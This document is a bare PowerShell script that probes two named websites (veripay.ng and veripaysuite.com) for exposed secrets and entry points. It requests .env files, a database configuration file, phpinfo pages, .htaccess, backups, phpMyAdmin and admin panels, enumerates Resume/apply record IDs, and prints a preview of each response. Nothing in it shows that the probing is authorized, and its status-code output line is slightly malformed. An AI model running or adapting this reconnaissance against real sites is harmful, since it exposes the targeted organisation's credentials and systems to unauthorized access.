$urls = @(
    'https://veripay.ng/robots.txt',
    'https://veripay.ng/.env',
    'https://veripay.ng/composer.json',
    'https://veripay.ng/phpinfo.php',
    'https://veripay.ng/.htaccess',
    'https://veripay.ng/application/config/database.php',
    'https://veripay.ng/system/',
    'https://veripay.ng/index.php/Home/admin',
    'https://veripay.ng/index.php/admin',
    'https://veripay.ng/admin',
    'https://veripay.ng/Admin',
    'https://veripay.ng/backup',
    'https://veripay.ng/api',
    'https://veripay.ng/index.php/Api',
    'https://veripaysuite.com/robots.txt',
    'https://veripaysuite.com/.env',
    'https://veripaysuite.com/.htaccess',
    'https://veripaysuite.com/phpmyadmin',
    'https://veripaysuite.com/phpMyAdmin',
    'https://www.veripaysuite.com/enugu/.env',
    'https://www.veripaysuite.com/enugu/robots.txt',
    'https://www.veripaysuite.com/enugu/phpinfo.php',
    'https://www.veripaysuite.com/enugu/admin',
    'https://www.veripaysuite.com/crs/admin',
    'https://veripay.ng/Resume/apply/100',
    'https://veripay.ng/Resume/apply/999',
    'https://veripay.ng/Resume/apply/0'
)

foreach ($url in $urls) {
    try {
        $r = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 8
        $preview = $r.Content.Substring(0, [Math]::Min(100, $r.Content.Length))
        Write-Output "[${$r.StatusCode}] $url => ${preview}"
    } catch {
        $code = ""
        if ($_.Exception.Response) { $code = $_.Exception.Response.StatusCode }
        Write-Output "[$code] $url"
    }
}
